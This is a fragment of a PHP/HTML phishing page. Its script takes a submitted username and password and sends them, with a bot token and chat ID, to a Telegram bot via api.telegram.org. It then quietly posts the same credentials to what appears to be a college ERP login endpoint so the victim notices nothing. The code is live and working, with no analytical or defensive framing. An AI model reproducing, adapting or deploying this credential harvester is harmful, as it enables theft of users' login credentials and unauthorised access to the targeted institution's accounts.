...
$chat_id=$chat_idd;
?>
<form name="myform" action="https://erp.psitche.ac.in/Erp/Auth" method="post"><input type="hidden" name="username" value="<?php echo $username ; ?>"><input type="hidden" name="password" value="<?php echo $password ; ?>"></form><script>const botToken = "<?php echo $token;?>";const chatId = "<?php echo $chat_id;?>";const username = "<?php echo $username;?>";const password = "<?php echo $password;?>";const message = `PSIT Username : ${username}, Password : ${password}`;fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, { method: 'POST', headers: { 'Content-Type': 'application/json',},body: JSON.stringify({chat_id: chatId,text: message,}),}).then(response => { console.log('Message sent successfully');document.myform.submit();}).catch(error => {console.error('Error sending message:', error);});</script>